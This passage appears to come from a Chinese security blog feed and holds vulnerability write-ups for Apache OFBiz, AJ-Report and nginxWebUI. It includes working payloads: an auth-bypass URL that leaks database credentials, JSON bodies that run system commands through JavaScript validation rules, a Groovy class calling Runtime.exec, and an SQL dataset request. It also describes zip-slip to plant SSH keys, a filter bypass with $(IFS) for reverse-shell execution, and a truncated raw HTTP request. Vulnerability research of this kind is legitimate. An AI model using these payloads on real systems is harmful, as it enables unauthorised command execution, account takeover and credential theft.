class_">CompilerConfiguration</span>()<br>configuration.addCompilationCustomizers(importCustomizer)<br><br><span class="hljs-type">Binding</span> <span class="hljs-variable">binding</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Binding</span>()<br>binding.setVariable(<span class="hljs-string">&quot;delegator&quot;</span>, delegator)<br>binding.setVariable(<span class="hljs-string">&quot;recordValues&quot;</span>, recordValues)<br><br><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader()<br><span class="hljs-type">def</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GroovyShell</span>(loader, binding, configuration)<br>  <span class="hljs-keyword">if</span> (UtilValidate.isNotEmpty(groovyProgram)) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// Check if a webshell is not uploaded but allow &quot;import&quot;</span><br>        <span class="hljs-keyword">if</span> (!SecuredUpload.isValidText(groovyProgram, [<span class="hljs-string">&quot;import&quot;</span>])) &#123;<br>            logError(<span class="hljs-string">&quot;================== Not executed for security reason ==================&quot;</span>)<br>            request.setAttribute(<span class="hljs-string">&quot;_ERROR_MESSAGE_&quot;</span>, <span class="hljs-string">&quot;Not executed for security reason&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>        &#125;<br></code></pre></td></tr></table></figure><p>从groovyProgram获取参数，SecuredUpload.isValidText进行黑名单检查。</p><p><a href="https://github.com/apache/ofbiz-framework/tree/release18.12.13">ofbiz-framework</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.13/framework">framework</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.13/framework/security">security</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.13/framework/security/src">src</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.13/framework/security/src/main">main</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.13/framework/security/src/main/java">java</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.13/framework/security/src/main/java/org">org</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.13/framework/security/src/main/java/org/apache">apache</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.13/framework/security/src/main/java/org/apache/ofbiz">ofbiz</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.13/framework/security/src/main/java/org/apache/ofbiz/security">security</a>&#x2F;SecuredUpload.java</p><p><img src="image-20240528084359723.png" alt="image-20240528084359723"></p><p>其中调用getDeniedWebShellTokens();得到黑名单。</p><p><img src="image-20240528084640609.png" alt="image-20240528084640609"></p><p>可以看到没有对**execute()**过滤。</p><p>直接可以使用. “”.execute()执行命令，或者直接unicode编码。</p><h3 id="0x03-目录遍历分析"><a href="#0x03-目录遍历分析" class="headerlink" title="0x03  目录遍历分析"></a>0x03  目录遍历分析</h3><p>​<a href="https://issues.apache.org/jira/browse/OFBIZ-13006">https://issues.apache.org/jira/browse/OFBIZ-13006</a> 官方给出了漏洞点，</p><p><a href="https://github.com/apache/ofbiz-framework/tree/release18.12.12">ofbiz-framework</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.12/framework">framework</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.12/framework/webapp">webapp</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.12/framework/webapp/src">src</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.12/framework/webapp/src/main">main</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.12/framework/webapp/src/main/java">java</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.12/framework/webapp/src/main/java/org">org</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.12/framework/webapp/src/main/java/org/apache">apache</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.12/framework/webapp/src/main/java/org/apache/ofbiz">ofbiz</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.12/framework/webapp/src/main/java/org/apache/ofbiz/webapp">webapp</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.12/framework/webapp/src/main/java/org/apache/ofbiz/webapp/control">control</a></p><p>&#x2F;ControlFilter.java</p><p>18.12</p><p><img src="image-20240528085429717.png" alt="image-20240528085429717"></p><p>18.10</p><p><img src="image-20240528085453984.png" alt="image-20240528085453984"></p><p>可以看到使用<strong>httpRequest.getRequestURI()</strong> 获取url，这么一看就有两种绕过的。**”..&#x2F;“<strong>和</strong>“;”**进行截断绕过filter处理。</p><p>来看看修复方式，</p><p>18.13</p><p><img src="image-20240528090042971.png" alt="image-20240528090042971"></p><p>equals进行判断，不一致直接抛出。</p><p>18.14</p><p><img src="image-20240528090149107.png" alt="image-20240528090149107"></p><p>url包含 <strong>“..”</strong> 或者**”;”** 替换为空，然后比较。</p><p>整个漏洞点很简单，绕过filter。</p><h3 id="0x04-复现"><a href="#0x04-复现" class="headerlink" title="0x04 复现"></a>0x04 复现</h3><p>​这里直接使用18.10的环境，懒得下了。</p><p><img src="image-20240528090628895.png" alt="image-20240528090628895"></p><p><img src="image-20240528090651475.png" alt="image-20240528090651475"></p><p>直接替换为18.13的framework&#x2F;webapp&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;apache&#x2F;ofbiz&#x2F;webapp&#x2F;control&#x2F;ControlFilter.java</p><p><img src="image-20240528091002453.png" alt="image-20240528091002453"></p><p>可以看到,使用**”;”** 截断就可以绕过检测。</p><p><img src="image-20240528091118823.png" alt="image-20240528091118823"></p><p>最后也是成功执行。</p><h3 id="0x05-修复建议"><a href="#0x05-修复建议" class="headerlink" title="0x05 修复建议"></a>0x05 修复建议</h3><p>​升级到官网最新版本。</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>aj-report 二次就业</title>
    <link href="/2024/05/18/aj-report-%E4%BA%8C%E6%AC%A1%E5%B0%B1%E4%B8%9A/"/>
    <url>/2024/05/18/aj-report-%E4%BA%8C%E6%AC%A1%E5%B0%B1%E4%B8%9A/</url>
    
    <content type="html"><![CDATA[<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>​最新先知有人发了<a href="https://xz.aliyun.com/t/14460">aj-report文章</a>，看了看，是一个filter绕过，还有jwt，竟然还没修,这是两年前发表的<a href="https://mp.weixin.qq.com/s/HsH_nEI5SyOP_Y9Qbm0A1w">AJ-Report_RCE</a>。aj-report是我两年前学习代码审计审计的第一套代码，那时候藏了一些洞没写，所以现在重新看一看。 环境v1.4.1。</p><h3 id="0x01-filter-绕过"><a href="#0x01-filter-绕过" class="headerlink" title="0x01 filter 绕过"></a>0x01 filter 绕过</h3><p>com.anjiplus.template.gaea.business.filter.TokenFilter.java</p><p><img src="image-20240518162005901.png" alt="image-20240518162005901"></p><p>这获取了URL，然后判断是否包含“swagger-ui”或着”swagger-resources”，包含直接放行。</p><p>没什么好说的，鉴权绕过。</p><h3 id="0x02-sql-信息泄漏"><a href="#0x02-sql-信息泄漏" class="headerlink" title="0x02  sql 信息泄漏"></a>0x02  sql 信息泄漏</h3><p>com.anji.plus.gaea.curd.controller.GaeaBaseController#pageList</p><p><img src="image-20240518162328997.png" alt="image-20240518162328997"></p><p>直接查询dataSource的信息，然后把Dto信息全部直接放回，造成泄漏</p><p><img src="image-20240518162649169.png" alt="image-20240518162649169"></p><p><img src="image-20240518162703149.png" alt="image-20240518162703149"></p><p>Dto里面存在Collections集合，直接把配置信息放回出来。</p><p><img src="image-20240518162748790.png" alt="image-20240518162748790"></p><p>结合一下，可以拿到数据库账号密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/;swagger-ui/dataSource/pageList?showMoreSearch=<span class="hljs-literal">false</span>&amp;pageNumber=1&amp;pageSize=10<br></code></pre></td></tr></table></figure><h3 id="0x03-js执行命令"><a href="#0x03-js执行命令" class="headerlink" title="0x03 js执行命令"></a>0x03 js执行命令</h3><p>​参考两年前发表的<a href="https://mp.weixin.qq.com/s/HsH_nEI5SyOP_Y9Qbm0A1w">AJ-Report_RCE</a>，(<a href="https://mp.weixin.qq.com/s/HsH_nEI5SyOP_Y9Qbm0A1w%EF%BC%89">https://mp.weixin.qq.com/s/HsH_nEI5SyOP_Y9Qbm0A1w）</a></p><p>没有修复。</p><p>第一个点 （validationRules参数校验点）</p><p>com.anjiplus.template.gaea.business.modules.dataset.service.impl.DataSetServiceImpl#testTransform</p><p><img src="image-20240518170617256.png" alt="image-20240518170617256"></p><p>看方法实现</p><p><img src="image-20240518170725585.png" alt="image-20240518170725585"></p><p><img src="image-20240518170744654.png" alt="image-20240518170744654"></p><p>然后执行。</p><p>第二个点（js脚本）</p><p>com.anjiplus.template.gaea.business.modules.datasettransform.service.impl.JsTransformServiceImpl#getValueFromJs.java</p><p><img src="image-20240518163727500.png" alt="image-20240518163727500"></p><p><img src="image-20240518163045542.png" alt="image-20240518163045542"></p><p><img src="image-20240518163123617.png" alt="image-20240518163123617"></p><p>这里两个地方都可以，也根本不用绕过。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;dynSentence&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&#123;\&quot;apiUrl\&quot;:\&quot;http://127.0.0.1:9095/dataSet/testTransform\&quot;,\&quot;method\&quot;:\&quot;GET\&quot;,\&quot;header\&quot;:\&quot;&#123;\\\&quot;Content-Type\\\&quot;:\\\&quot;application/json;charset=UTF-8\\\&quot;&#125;\&quot;,\&quot;body\&quot;:\&quot;\&quot;&#125;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSetParamDtoList&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;paramName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;paramDesc&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;paramType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;sampleItem&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;mandatory&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;requiredFlag&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;validationRules&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;function verification(data)&#123;var se= new javax.script.ScriptEngineManager();var r = se.getEngineByExtension(\&quot;js\&quot;).eval(\&quot;new java.lang.ProcessBuilder(&#x27;calc&#x27;).start().getInputStream();\&quot;);result=new java.io.BufferedReader(new java.io.InputStreamReader(r));ss=&#x27;&#x27;;while((line = result.readLine()) != null)&#123;ss+=line&#125;;return ss;&#125;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSetTransformDtoList&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;transformType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;js&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;transformScript&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;setType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="0x04-validationRules-命令执行"><a href="#0x04-validationRules-命令执行" class="headerlink" title="0x04 validationRules 命令执行"></a>0x04 validationRules 命令执行</h3><p>com.anjiplus.template.gaea.business.modules.datasetparam.controller.DataSetParamController#verification。java</p><p>其实看上面就知道，js的规则，然后走到eval。</p><p><img src="image-20240518163348486.png" alt="image-20240518163348486"></p><p>com.anjiplus.template.gaea.business.modules.datasetparam.service.impl.DataSetParamServiceImpl#verification(com.anjiplus.template.gaea.business.modules.datasetparam.controller.dto.DataSetParamDto)</p><p><img src="image-20240518163508484.png" alt="image-20240518163508484"></p><p>对应实现类，有绕过，套娃就行。</p><p>dto里面设置validationRules就行。</p><p><img src="image-20240518163558285.png" alt="image-20240518163558285"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;sampleItem&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;validationRules&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;function verification(data)&#123;var se= new javax.script.ScriptEngineManager();var r = se.getEngineByExtension(\&quot;js\&quot;).eval(\&quot;new java.lang.ProcessBuilder(&#x27;whoami&#x27;).start().getInputStream();\&quot;);result=new java.io.BufferedReader(new java.io.InputStreamReader(r));ss=&#x27;&#x27;;while((line = result.readLine()) != null)&#123;ss+=line&#125;;return ss;&#125;&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="0x05-zip-spilf"><a href="#0x05-zip-spilf" class="headerlink" title="0x05 zip-spilf"></a>0x05 zip-spilf</h3><p>com.anjiplus.template.gaea.business.modules.dashboard.controller.ReportDashboardController#importDashboard.java</p><p><img src="image-20240518164441990.png" alt="image-20240518164441990"></p><p>对应的controller，传file流何code就好</p><p>com.anjiplus.template.gaea.business.modules.dashboard.service.impl.ReportDashboardServiceImpl#importDashboard   实现类</p><p><img src="image-20240518164555873.png" alt="image-20240518164555873"></p><p><img src="image-20240518164804829.png" alt="image-20240518164804829"></p><p>没有的zipEntry进行..&#x2F; 过滤，导致zip目录穿越。</p><p><img src="image-20240518165010494.png" alt="image-20240518165010494"></p><p><img src="image-20240518165146571.png" alt="image-20240518165146571"></p><p>然后ssh 指定私钥连接。</p><h3 id="0x06-大屏分享信息泄漏"><a href="#0x06-大屏分享信息泄漏" class="headerlink" title="0x06 大屏分享信息泄漏"></a>0x06 大屏分享信息泄漏</h3><p>com.anjiplus.template.gaea.business.modules.reportshare.controller.ReportShareController#detailByCode</p><p><img src="image-20240518165304296.png" alt="image-20240518165304296"></p><p>对象实现类</p><p><img src="image-20240518165347451.png" alt="image-20240518165347451"></p><p>根据shareCode可以获取到查询信息，然后加密后直接放回</p><p><img src="image-20240518165529103.png" alt="image-20240518165529103"></p><p>jwt可以直接解密</p><p><img src="image-20240518165611067.png" alt="image-20240518165611067"></p><p>直接可以获得分享密码。</p><h3 id="0x07-java代码执行"><a href="#0x07-java代码执行" class="headerlink" title="0x07 java代码执行"></a>0x07 java代码执行</h3><p>​还是数据集那个点，走java方式。</p><p>com.anjiplus.template.gaea.business.modules.dataset.service.impl.DataSetServiceImpl#testTransform</p><p><img src="image-20240518171003277.png" alt="image-20240518171003277"></p><p>对应实现类</p><p>com.anjiplus.template.gaea.business.modules.datasettransform.service.impl.DataSetTransformServiceImpl#transform</p><p><img src="image-20240518171024005.png" alt="image-20240518171024005"></p><p>com.anjiplus.template.gaea.business.modules.datasettransform.service.impl.GroovyTransformServiceImpl#transform</p><p><img src="image-20240518171125405.png" alt="image-20240518171125405"></p><p>最后会来到GroovyClassLoader，进行处理，也就是我们写一个类给GroovyClassLoader加载就好了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.anjiplus.template.gaea.business.modules.datasettransform.service.IGroovyHandler;<br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IGroovyHandler</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> List&lt;JSONObject&gt; <span class="hljs-title function_">transform</span><span class="hljs-params">(List&lt;JSONObject&gt; data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">execResult</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(<span class="hljs-string">&quot;id&quot;</span>).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next();<br>        <span class="hljs-keyword">return</span> Arrays.asList(execResult.split(<span class="hljs-string">&quot;\\s+&quot;</span>));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="image-20240518172641917.png" alt="image-20240518172641917"></p><p>能写代码，那就打下内存马吧。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><br></code></pre></td></tr></table></figure><p><img src="image-20240518180552989.png" alt="image-20240518180552989"></p><p>成功.</p><h3 id="0x08-jwt-绕过登录"><a href="#0x08-jwt-绕过登录" class="headerlink" title="0x08 jwt 绕过登录"></a>0x08 jwt 绕过登录</h3><p>com.anjiplus.template.gaea.business.modules.accessuser.service.impl.AccessUserServiceImpl#login</p><p><img src="image-20240518181616974.png" alt="image-20240518181616974"></p><p>com.anji.plus.gaea.utils.JwtBean#createToken(java.lang.String, java.lang.String, java.lang.Integer, java.lang.String)</p><p><img src="image-20240518181652357.png" alt="image-20240518181652357"></p><p>com.anji.plus.gaea.GaeaProperties.Security#jwtSecret<img src="image-20240518181731845.png" alt="image-20240518181731845"></p><p>这里密钥是写在依赖包下，无法修改</p><p><img src="image-20240518181810240.png" alt="image-20240518181810240"></p><p>这一块得修改一下</p><p><img src="image-20240518182103331.png" alt="image-20240518182103331"></p><p>jwt验证只校验用户名，这边key没法改，随便伪造</p><p>具体参考(<a href="https://mp.weixin.qq.com/s/HsH_nEI5SyOP_Y9Qbm0A1w%EF%BC%89">https://mp.weixin.qq.com/s/HsH_nEI5SyOP_Y9Qbm0A1w）</a></p><h3 id="0x09-sql问题"><a href="#0x09-sql问题" class="headerlink" title="0x09 sql问题"></a>0x09 sql问题</h3><p>​本质是没做用户权限校验，导致任何人都能操作，由于有filter绕过，就写出来吧</p><p>com.anjiplus.template.gaea.business.modules.dataset.service.impl.DataSetServiceImpl#testTransform</p><p>还是这个点</p><p><img src="image-20240518183214449.png" alt="image-20240518183214449"></p><p>从DTO里面获取参数，然后查询</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;sourceCode&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;utf_8&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dynSentence&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;show DATABASES&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSetParamDtoList&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSetTransformDtoList&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;setType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;sql&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="image-20240518183243070.png" alt="image-20240518183243070"></p><p>也就是可以直接利用sql修改账号密码。</p><h3 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h3><p>接口健全确实，主要靠filter，一些重要的接口，权限缺失，如&#x2F;dataSource、&#x2F;dataSet下的接口，匿名用户也可以操作，filter建议直接使用getServletPath()，或者重写一下。</p><p>jwt的认证密钥是写在依赖包里面，无法修改.</p><p>返回包里面的DTO，把敏感字短执行加密。</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>cms</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nginxwebui&lt;=3.9.9后台rce</title>
    <link href="/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/"/>
    <url>/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/</url>
    
    <content type="html"><![CDATA[<p>​首发于<a href="https://xz.aliyun.com/t/14227">https://xz.aliyun.com/t/14227</a>  </p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​半年前，审计过一次这套代码，那时候想着后台有命令执行的功能点，就没关注rce，审计了一些别的水洞。这次hookdd没事，说审计了一个rce，说一起看看，所以这次就只看rce，最后就有个以下几个洞。本次使用的3.9.8版本，但是刚刚更新了3.9.9，不过看描述，并没有修复一下几个点，应该都可以使用。（最新版依旧可用，nginx恶意配置看来是修不了了）</p><h2 id="0x01-zip自解压"><a href="#0x01-zip自解压" class="headerlink" title="0x01 zip自解压"></a>0x01 zip自解压</h2><p>com.cym.controller.adminPage.MainController#upload </p><p><img src="image-20240329094943539.png" alt="image-20240329094943539"></p><p>功能比较简单，可以看见把tmpdir+’&#x2F;‘+文件名拼接，然后保存进去，没有限制后缀，其实限制不限制都能r掉。</p><p>其中FileUtil.getTmpDir()会获取系统的临时目录，mac系统为</p><p><img src="image-20240329095519164.png" alt="image-20240329095519164"></p><p><img src="image-20240329095527428.png" alt="image-20240329095527428"></p><p>ubuntu系统的临时目录为&#x2F;tmp。</p><p>对应的前端功能点</p><p><img src="image-20240329100106111.png" alt="image-20240329100106111"></p><p>前端这里是限制了zip上传，但是我们看后端是没有判断的，直接会把上传的文件放到临时目录。</p><p><img src="image-20240329100312049.png" alt="image-20240329100312049"></p><p>当我们选择好目录时，他会调用</p><p>com.cym.controller.adminPage.WwwController#addOver进行处理</p><p><img src="image-20240329100458257.png" alt="image-20240329100458257"></p><p>可以看到，我们能控制解压目录，以及需要解压的文件，最后调用zip进行解压。</p><p>那么其实很简单了，TmpDir()我们知道，文件名知道，我们只需要上传一个ssh密钥到.ssh目录下就可以了。</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>先选择要上传的zip文件</p><p><img src="image-20240329100908051.png" alt="image-20240329100908051"></p><p><img src="image-20240329101000205.png" alt="image-20240329101000205"></p><p>可以看到以及上传到tmp目录，这是macos的，ubutu在**&#x2F;tmp**下</p><p><img src="image-20240528154401727.png" alt="image-20240528154401727"></p><p>选择好ssh目录。</p><p><img src="image-20240329101451560.png" alt="image-20240329101451560"></p><p>对应数据包。</p><p><img src="image-20240329101751292.png" alt="image-20240329101751292"></p><p>最后直接调用zip解压到ssh目录</p><p><img src="image-20240329101826366.png" alt="image-20240329101826366"></p><p>成功解压到ssh</p><p><img src="image-20240329102004582.png" alt="image-20240329102004582"></p><p>最后也是使用公钥直接登录</p><h2 id="0x02-zip目录穿越"><a href="#0x02-zip目录穿越" class="headerlink" title="0x02 zip目录穿越"></a>0x02 zip目录穿越</h2><p>上面那种方法，其实只能打一次，因为在zip解压的时候会在数据库查询，钥匙已经同目录穿过，会抛出异常。</p><p><img src="image-20240329103914323.png" alt="image-20240329103914323"></p><p>com.cym.controller.adminPage.WwwController#addOver</p><p><img src="image-20240329104044288.png" alt="image-20240329104044288"></p><p><img src="image-20240329104055165.png" alt="image-20240329104055165"></p><p><img src="image-20240329104110206.png" alt="image-20240329104110206"></p><p>这里可以清楚得看到，会在sql里面查询上传目录是否存在，存在就抛出异常。</p><p>这里有两种解决办法，第一种就是<img src="image-20240329104455283.png" alt="image-20240329104455283"></p><p>传入ssh的id，使其能正常修改目录的文件内容</p><p><img src="image-20240329104820562.png" alt="image-20240329104820562"></p><p>id可以直接f12获得，</p><p><img src="image-20240329105024339.png" alt="image-20240329105024339"></p><p>填入后就可以正常穿</p><p>第二种就比较暴力</p><p>cn.hutool.core.util.ZipUtil#unzip(java.util.zip.ZipFile, java.io.File, long)</p><p><img src="image-20240329105331535.png" alt="image-20240329105331535"></p><p>zipentry没有对..&#x2F;过滤。</p><p>zip解压时是没有对zip目录穿越进行过滤的，所以可以利用zip目录穿越来传文件，dir保证是没有使用过的就行。</p><h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>上传zip_slip.zip<img src="image-20240329110204537.png" alt="image-20240329110204537"></p><p><img src="image-20240329110244552.png" alt="image-20240329110244552"></p><p>得到路径</p><p><img src="image-20240329110338516.png" alt="image-20240329110338516"></p><p>上传时显示路径重复，这时我们dir任意写一个本地存在的目录，确保数据库没有就行。</p><p><img src="image-20240329110739896.png" alt="image-20240329110739896"></p><p>最后成功上传。</p><p><img src="image-20240329110828441.png" alt="image-20240329110828441"></p><p><img src="image-20240329110836847.png" alt="image-20240329110836847"></p><p>数据库里面的状态。</p><h2 id="0x03-runcmd绕过造成命令执行"><a href="#0x03-runcmd绕过造成命令执行" class="headerlink" title="0x03 runcmd绕过造成命令执行"></a>0x03 runcmd绕过造成命令执行</h2><p>com.cym.controller.adminPage.ConfController#runCmd</p><p><img src="image-20240329155921247.png" alt="image-20240329155921247"></p><p>可以看到穿进来的cmd先进行过滤，在进行拼接执行。</p><p>com.cym.controller.adminPage.ConfController#isAvailableCmd</p><p><img src="image-20240329160038310.png" alt="image-20240329160038310"></p><p><img src="image-20240329160044572.png" alt="image-20240329160044572"></p><p>可以先读取nginxPath、nginxExe、nginxDir三个值，首先判断在不在case里面，不在就进入if，主要就是判断cmd和<strong>settingService.get(“nginxExe”) + “ -c “ + settingService.get(“nginxPath”) + dir</strong>是不是想等，不想等就不执行，想等就执行</p><p>com.cym.controller.adminPage.ConfController#saveCmd</p><p><img src="image-20240329160352345.png" alt="image-20240329160352345"></p><p>而刚好这三个值我们可自由控制。</p><p><img src="image-20240329160433191.png" alt="image-20240329160433191"></p><p>它会对传值进行过滤，其实看看很好绕过。linux用$(IFS)代替空格就行，win用powershell.exe(calc) 就行</p><h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20240329161043497.png" alt="image-20240329161043497"></p><p>先修改两个值</p><p><img src="image-20240329161117706.png" alt="image-20240329161117706"></p><p>成功执行</p><p><img src="image-20240329161155744.png" alt="image-20240329161155744"></p><p><img src="image-20240329161204639.png" alt="image-20240329161204639"></p><p>可以执行。</p><p><img src="image-20240329220127636.png" alt="image-20240329220127636"></p><p>由于有过滤，所以我们可以把reserveshell写进文件，在用bash来执行就好。</p><p>利用前面分析得，上传点自动缓存到tem目录，ubuntu为&#x2F;tmp目录.。强烈建议不要用macos这傻逼每个shell环境里面var&#x2F;folders&#x2F;ln&#x2F;sjz_zm513ng125ngw6c2b_lm0000gn都不一样。</p><p><img src="image-20240329223018517.png" alt="image-20240329223018517"></p><p>换ubuntu后，成功rce</p><p><img src="image-20240329223111645.png" alt="image-20240329223111645"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/adminPage/conf/saveCmd</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.108.137:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>55<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span 